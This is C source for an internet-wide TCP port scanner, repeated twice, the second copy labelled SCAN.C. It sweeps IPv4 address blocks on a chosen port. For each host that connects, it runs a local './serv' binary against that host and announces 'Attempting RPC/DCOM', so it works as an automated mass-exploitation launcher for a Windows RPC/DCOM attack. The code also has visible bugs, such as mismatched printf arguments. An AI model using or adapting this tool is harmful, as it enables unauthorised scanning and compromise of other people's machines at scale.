#include <stdio.h>
#include <string.h>
#include <time.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <errno.h>

#define MAX_SOCKETS 1000
#define TIMEOUT 2

#define S_NONE 0
#define S_CONNECTING 1

struct conn_t {
	int s;
	char status;
	time_t a;
	struct sockaddr_in addr;
};
struct conn_t connlist[MAX_SOCKETS];

void init_sockets(void);
void check_sockets(void);
void fatal(char *);

int main(int argc, char *argv[])
{
	int done, i, aa, bb, cc, dd, ret, k, ns;
	unsigned int port;
	time_t scantime;
	char ip[20];

	if (argc < 3) {
		printf("Usage: %s <a-block> <port> [b-block] [c-block]\n", argv[0]);
		return -1;
	}

	done = 0; bb = 0; cc = 0; dd = 0; aa = 0; port = 0;
	aa = atoi(argv[1]);
	if ((aa < 0) || (aa > 255)) {
		fatal("Invalid a-range\n");
	}
	port = (unsigned int)atoi(argv[2]);
	if (port == 0)
		fatal("Bad port number.\n"); 
	if (argc >= 4) {
		bb = atoi(argv[3]);
		if ((bb < 0) || (bb > 255))
		fatal("Invalid b-range.\n");
	}

	if (argc >= 5) {
		cc = atoi(argv[4]);
		if ((cc < 0) || (cc > 255))
		fatal("Invalid c-range.\n");
	} 
	init_sockets();
	scantime = time(0);
	while(!done) {
		for (i = 0; i < MAX_SOCKETS; i++) 
		{
			if (dd == 255) 
			{
				if (cc < 255) {
					cc++;
					dd = 0;
				}
				else {
					if (bb < 255) {
						bb++;
						cc = 0;
						dd = 0;
					}
					else {
						if (aa < 255) {
							aa++;
							bb = 0;
							cc = 0;
							dd = 0;
						}
						else {
							ns = 0;
							for (k = 0; k < MAX_SOCKETS; k++) {
								if (connlist[k].status > S_NONE)
								ns++;
							}
							if (ns == 0)
								break;
						}
					}
				}
			}
			if (connlist[i].status == S_NONE) {
				connlist[i].s = socket(AF_INET, SOCK_STREAM, 0);
				if (connlist[i].s != -1) {
					ret = fcntl(connlist[i].s, F_SETFL, O_NONBLOCK);
					if (ret == -1) {
						printf("Unable to set O_NONBLOCK\n");
						close(connlist[i].s);
					}
					else {
						memset((char *)ip, 0, 20);
						sprintf(ip, "%d.%d.%d.%d", aa, bb, cc, dd);
						connlist[i].addr.sin_addr.s_addr = inet_addr(ip);
						if (connlist[i].addr.sin_addr.s_addr == -1)
							fatal("Invalid IP.");
							connlist[i].addr.sin_family = AF_INET;
							connlist[i].addr.sin_port = htons(port);
							connlist[i].a = time(0);
							connlist[i].status = S_CONNECTING;
							dd++;
					}
				}
			}
		}
		check_sockets();
	}
}

void init_sockets(void)
{
	int i;
	for (i = 0; i < MAX_SOCKETS; i++) {
		connlist[i].status = S_NONE;
		memset((struct sockaddr_in *)&connlist[i].addr, 0, 
		sizeof(struct sockaddr_in));
	}
}

void check_sockets(void)
{
	int i, ret;

	for (i = 0; i < MAX_SOCKETS; i++) {
		if ((connlist[i].a < (time(0) - TIMEOUT)) &&
			(connlist[i].status == S_CONNECTING)) {
			close(connlist[i].s);
			connlist[i].status = S_NONE;
		}

		else if (connlist[i].status == S_CONNECTING) {
			ret = connect(connlist[i].s,
			(struct sockaddr *)&connlist[i].addr,
			sizeof(struct sockaddr_in));
			if (ret == -1) {
				if (errno == EISCONN) {
					printf("%s\n",
					(char *)inet_ntoa(connlist[i].addr.sin_addr),
					(time(0)-connlist[i].a));
					close(connlist[i].s);
					connlist[i].status = S_NONE;
				}
				if ((errno != EALREADY) && (errno != EINPROGRESS)) {
					close(connlist[i].s);
					connlist[i].status = S_NONE;
				}

			}
			else {
				char luck[100];
				sprintf(luck,"./serv %s",(char *)inet_ntoa(connlist[i].addr.sin_addr),(time(0)-connlist[i].a));
				printf("Attempting RPC/DCOM on %s\n",
				(char *)inet_ntoa(connlist[i].addr.sin_addr),
				(time(0)-connlist[i].a));
				system(luck);
				printf("Done with %s Next ...\n");
				close(connlist[i].s);
				connlist[i].status = S_NONE;
			}
		}
	}
}

void fatal(char *err)
{
	int i;
	printf("Error: %s\n", err);
	for (i = 0; i < MAX_SOCKETS; i++) {
		if (connlist[i].status >= S_CONNECTING)
			close(connlist[i].s);
	}
	exit(-1);
}
/*SCAN.C*/
#include <stdio.h>
#include <string.h>
#include <time.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <errno.h>

#define MAX_SOCKETS 1000
#define TIMEOUT 2

#define S_NONE 0
#define S_CONNECTING 1

struct conn_t {
	int s;
	char status;
	time_t a;
	struct sockaddr_in addr;
};
struct conn_t connlist[MAX_SOCKETS];

void init_sockets(void);
void check_sockets(void);
void fatal(char *);

int main(int argc, char *argv[])
{
	int done, i, aa, bb, cc, dd, ret, k, ns;
	unsigned int port;
	time_t scantime;
	char ip[20];

	if (argc < 3) {
		printf("Usage: %s <a-block> <port> [b-block] [c-block]\n", argv[0]);
		return -1;
	}

	done = 0; bb = 0; cc = 0; dd = 0; aa = 0; port = 0;

	aa = atoi(argv[1]);
	if ((aa < 0) || (aa > 255)) {
		fatal("Invalid a-range\n");
	}

	port = (unsigned int)atoi(argv[2]);
	if (port == 0)
		fatal("Bad port number.\n"); 

	if (argc >= 4) {
		bb = atoi(argv[3]);
		if ((bb < 0) || (bb > 255))
		fatal("Invalid b-range.\n");
	}

	if (argc >= 5) {
		cc = atoi(argv[4]);
		if ((cc < 0) || (cc > 255))
		fatal("Invalid c-range.\n");
	} 

	init_sockets();

	scantime = time(0);

	while(!done) {
		for (i = 0; i < MAX_SOCKETS; i++) {
			if (dd == 255) {
				if (cc < 255) {
				cc++;
					dd = 0;
				}
				else {
					if (bb < 255) {
						bb++;
						cc = 0;
						dd = 0;
					}
					else {
						if (aa < 255) {
							aa++;
							bb = 0;
							cc = 0;
							dd = 0;
						}
						else {
							ns = 0;
							for (k = 0; k < MAX_SOCKETS; k++) {
							if (connlist[k].status > S_NONE)
								ns++;
							}
					
							if (ns == 0)
								break;
						}
					}
				}
			}
	
			if (connlist[i].status == S_NONE) {
				connlist[i].s = socket(AF_INET, SOCK_STREAM, 0);
				if (connlist[i].s != -1) {
					ret = fcntl(connlist[i].s, F_SETFL, O_NONBLOCK);
					if (ret == -1) {
						printf("Unable to set O_NONBLOCK\n");
						close(connlist[i].s);
					}
					else {
						memset((char *)ip, 0, 20);
						sprintf(ip, "%d.%d.%d.%d", aa, bb, cc, dd);
						connlist[i].addr.sin_addr.s_addr = inet_addr(ip);
						if (connlist[i].addr.sin_addr.s_addr == -1)
							fatal("Invalid IP.");
						connlist[i].addr.sin_family = AF_INET;
						connlist[i].addr.sin_port = htons(port);
						connlist[i].a = time(0);
						connlist[i].status = S_CONNECTING;
						dd++;
					}
				}
			}
		}
		check_sockets();
	}
}

void init_sockets(void)
{
	int i;
	
	for (i = 0; i < MAX_SOCKETS; i++) {
		connlist[i].status = S_NONE;
		memset((struct sockaddr_in *)&connlist[i].addr, 0, 
		sizeof(struct sockaddr_in));
	}
}

void check_sockets(void)
{
	int i, ret;
	
	for (i = 0; i < MAX_SOCKETS; i++) {
		if ((connlist[i].a < (time(0) - TIMEOUT)) &&
			(connlist[i].status == S_CONNECTING)) 
		{
			close(connlist[i].s);
			connlist[i].status = S_NONE;
		}

		else if (connlist[i].status == S_CONNECTING) 
			{
				ret = connect(connlist[i].s,
				(struct sockaddr *)&connlist[i].addr,
				sizeof(struct sockaddr_in));
				if (ret == -1) {
					if (errno == EISCONN) {
						printf("%s\n",
						(char *)inet_ntoa(connlist[i].addr.sin_addr),
						(time(0)-connlist[i].a));
						close(connlist[i].s);
						connlist[i].status = S_NONE;
					}
		
					if ((errno != EALREADY) && (errno != EINPROGRESS)) {
						close(connlist[i].s);
						connlist[i].status = S_NONE;
					}
				}

				else {
					char luck[100];
					sprintf(luck,"./serv %s",(char *)inet_ntoa(connlist[i].addr.sin_addr),(time(0)-connlist[i].a));
					printf("Attempting RPC/DCOM on %s\n",
					(char *)inet_ntoa(connlist[i].addr.sin_addr),
					(time(0)-connlist[i].a));
					system(luck);
					printf("Done with %s Next ...\n");
					close(connlist[i].s);
					connlist[i].status = S_NONE;
				}
			}
		}
}

void fatal(char *err)
{
	int i;
	printf("Error: %s\n", err);
	for (i = 0; i < MAX_SOCKETS; i++) {
		if (connlist[i].status >= S_CONNECTING)
			close(connlist[i].s);
	}
	exit(-1);
}
